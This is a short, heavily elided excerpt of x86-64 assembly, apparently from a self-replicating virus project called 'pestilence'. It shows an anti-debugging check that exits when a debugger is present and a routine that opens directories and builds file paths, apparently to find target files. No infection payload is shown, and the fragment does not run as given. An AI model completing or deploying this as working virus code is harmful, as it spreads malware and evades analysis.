...
_start:
	...
	pop rbp
	_bf_exit:
    jmp _pestilence_exit

; if launched by a debugger leave
_check_debug:
...
_readDir:
	...
	or qword [r8], -1
    lea r8, FAM(pestilence.pwdPtr)
    mov [r8], rdi
    lea r8, FAM(pestilence.lenghtPwd)
    mov [r8], rsi
    mov rax, SYS_OPEN
    ...
    cmp rax, 0
	jl _returnReadir
    lea rdi, FAM(pestilence.fd)                         ; enregistre le fd dans la struct
    mov [rdi], rax
    ...
    _listFile:
        ...
        _updatePath:
            ...
            mov byte [rsi - 1], '/'
            sub rsi, FAM(pestilence.lenghtPwd)
            mov rdi, FAM(pestilence.pwdPtr)
            call _strcpy
